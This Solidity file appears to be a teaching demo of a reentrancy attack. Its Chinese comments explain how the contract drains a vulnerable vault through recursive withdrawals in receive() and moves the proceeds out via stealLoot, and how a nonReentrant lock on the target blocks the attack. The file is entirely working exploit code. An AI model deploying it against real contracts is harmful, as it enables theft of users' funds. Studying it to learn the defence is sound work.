// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @dev 定义目标金库的接口，让攻击合约知道如何调用对方的函数
 */
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

/**
 * @title GoldThief
 * @notice 这是一个黑客攻击模拟合约，专门用于展示重入攻击。
 */
contract GoldThief {
    IVault public targetVault; // 被攻击的目标金库合约
    address public owner;       // 攻击者的地址
    uint public attackCount;    // 记录重入次数，防止 Gas 耗尽或死循环
    bool public attackingSafe;  // 标记位：记录当前是在攻击“有漏洞”还是“安全”的函数

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    /**
     * @notice 攻击存在漏洞的提现函数
     * @dev 逻辑：存入 1 ETH 获得提现资格，然后发起提现触发 receive() 循环
     */
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false; // 标记：当前攻击无防御函数
        attackCount = 0;       // 重置计数器

        // 1. 先存钱，骗取提现资格
        targetVault.deposit{value: msg.value}();
        // 2. 发起第一次提现，这会触发本合约底部的 receive()
        targetVault.vulnerableWithdraw();
    }

    /**
     * @notice 尝试攻击带有防重入锁（nonReentrant）的函数
     * @dev 预期结果：由于目标合约有状态锁，第二次进入会直接报错（Revert）
     */
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true; // 标记：当前攻击有防御函数
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    /**
     * @dev 核心黑客逻辑：当金库给本合约发钱（ETH）时，此函数自动触发。
     * 趁金库还没来得及更新余额账本，我们再次调用提现。
     */
    receive() external payable {
        attackCount++;

        // 攻击逻辑：
        // 如果攻击的是漏洞函数 && 金库还有钱 && 重入次数没到上限（这里设为5次）
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            // 再次调用提现！此时金库里的代码还卡在“发钱”那一步，还没跑到“余额归零”那一步
            targetVault.vulnerableWithdraw();
        }

        // 如果攻击的是安全函数：
        if (attackingSafe) {
            // 这次尝试会触发目标合约的 nonReentrant 锁，导致整个交易回滚
            targetVault.safeWithdraw(); 
        }
    }

    /**
     * @notice 提取战利品
     * @dev 把抢到的 ETH 从这个攻击合约转到黑客自己的钱包里
     */
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    /// @notice 查看当前合约里抢到了多少钱
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}